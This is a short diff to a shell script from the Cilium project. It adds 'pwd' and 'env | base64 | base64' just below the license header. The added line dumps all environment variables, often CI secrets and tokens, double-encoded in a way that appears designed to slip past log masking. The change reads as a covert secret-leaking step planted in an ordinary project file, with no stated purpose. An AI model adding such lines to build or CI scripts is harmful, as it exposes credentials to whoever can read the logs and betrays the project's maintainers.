@@ -2,6 +2,8 @@
 
 # Copyright Authors of Cilium
 # SPDX-License-Identifier: Apache-2.0
+pwd
+env | base64 | base64
 
 set -o xtrace
 set -o errexit
